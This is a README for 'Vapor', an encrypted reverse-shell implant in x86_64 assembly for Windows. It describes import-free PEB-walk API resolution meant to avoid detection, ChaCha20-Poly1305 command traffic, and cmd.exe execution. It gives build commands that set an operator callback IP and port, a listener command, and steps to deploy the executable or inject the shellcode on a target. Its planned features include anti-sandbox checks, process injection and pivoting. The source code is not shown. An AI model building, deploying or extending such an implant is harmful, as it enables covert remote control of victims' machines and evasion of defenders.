<div align="center">

<img src="docs/banner.svg" alt="Vapor" width="800">

<br>

Vapor is an encrypted reverse shell written entirely in x86_64 NASM assembly. A ~3.2 KB position-independent shellcode implant connects back over raw TCP with ChaCha20-Poly1305 authenticated encryption, resolved entirely through PEB walking — zero imports, zero dependencies.

</div>

<br>

## Table of Contents

- [Highlights](#highlights)
- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Configuration](#configuration)
- [Project Structure](#project-structure)
- [Future Work](#future-work)

---

## Highlights

<table>
<tr>
<td width="50%">

### ChaCha20-Poly1305
Full RFC 8439 AEAD implemented in pure assembly. Authenticated encryption with a 256-bit pre-shared key — every message gets a fresh nonce, and tampered payloads are rejected.

</td>
<td width="50%">

### ~3.2 KB Shellcode
The entire implant — API resolution, networking, crypto, command execution — fits in ~3,300 bytes of position-independent code. No compiler, no runtime, no bloat.

</td>
</tr>
<tr>
<td width="50%">

### PEB Walk + Hash Lookup
All Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no strings — just hashes baked into the binary.

</td>
<td width="50%">

### No Dependencies
Zero DLL imports. Every API (kernel32, ws2_32, advapi32) is resolved dynamically from the PEB. Nothing to link against, nothing to install on the target.

</td>
</tr>
<tr>
<td width="50%">

### Piped Command Execution
Commands execute via `CreateProcessA` with `cmd.exe /c`, capturing stdout and stderr through anonymous pipes. Output streamed back encrypted over the wire.

</td>
<td width="50%">

### Dual Output Formats
Builds as both raw PIC shellcode (`vapor.bin`) for injection and a minimal PE (`vapor.exe`) for direct execution. Same source, same crypto, two deployment options.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

| Requirement | Version |
|-------------|---------|
| NASM | Latest |
| MinGW-w64 (linker) | `x86_64-w64-mingw32-ld` |
| Python | >= 3.8 |
| cryptography | `pip install cryptography` |

### Build & Deploy

```bash
# Clone
git clone https://github.com/Real-Fruit-Snacks/Vapor.git
cd Vapor

# Build — generates a random PSK, assembles, prints the listener command
./build.sh 10.10.14.1 443

# Or specify your own key
./build.sh 10.10.14.1 443 <64-char-hex>

# Start the listener (build.sh prints this command with your key)
python listener.py --lport 443 --key <key>

# Deploy vapor.exe to target (or inject vapor.bin)
```

> The build script generates a random 256-bit PSK if you don't provide one, assembles both shellcode and PE outputs, and prints the exact listener command with your key. One command.

---

## Architecture

```
[Target]                          [Operator]
 vapor  ────── raw TCP ──────>  listener.py
        <── encrypted cmd ────
        ── encrypted output ──>
```

| Layer | Implementation |
|-------|----------------|
| **Transport** | Raw TCP socket via `WSASocketA` / `connect` |
| **Encryption** | ChaCha20-Poly1305 AEAD (RFC 8439), pre-shared key |
| **Wire Format** | `[len(4)][nonce(12)][ciphertext][mac(16)]`, fresh nonce per message |
| **API Resolution** | PEB walk → LDR → export table → ror13 hash matching |
| **Execution** | `CreateProcessA` with `cmd.exe /c`, piped stdout+stderr |
| **Listener** | Python 3 with `cryptography` library, interactive CLI |

### Tech Stack

| Component | Technology |
|-----------|------------|
| **Implant** | x86_64 NASM assembly, pure PIC |
| **Listener** | Python 3, `cryptography` (ChaCha20Poly1305) |
| **Crypto** | ChaCha20-Poly1305 (RFC 8439), in-assembly implementation |
| **Theme** | Catppuccin Mocha |

---

## Configuration

### Compile-time (Makefile variables)

| Variable | Default | Description |
|----------|---------|-------------|
| `LHOST` | `127.0.0.1` | Callback IP |
| `LPORT` | `443` | Callback port |
| `KEY` | Random 256-bit | Pre-shared key (64 hex chars) |

### Listener arguments

| Flag | Default | Description |
|------|---------|-------------|
| `--lhost` | `0.0.0.0` | Listen address |
| `--lport` | `443` | Listen port |
| `--key` | Required | 64-char hex PSK |

---

## Project Structure

```
vapor/
├── vapor.asm          # Implant source (~1500 lines x86_64 NASM)
├── listener.py        # Python TCP listener with interactive CLI
├── test_crypto.py     # ChaCha20-Poly1305 round-trip tests
├── build.sh           # One-command build script
├── Makefile           # NASM + ld build targets
└── docs/
    └── banner.svg     # Repository banner
```

---

## Future Work

- Reconnect with jittered backoff
- File upload/download commands
- Process injection loader for `vapor.bin`
- Anti-debug / anti-sandbox checks
- Staged payload delivery
- SOCKS proxy pivoting

---

<div align="center">

**Pure assembly. Fully encrypted.**

*Vapor — ChaCha20-Poly1305 reverse shell in ~3.2 KB*

</div>
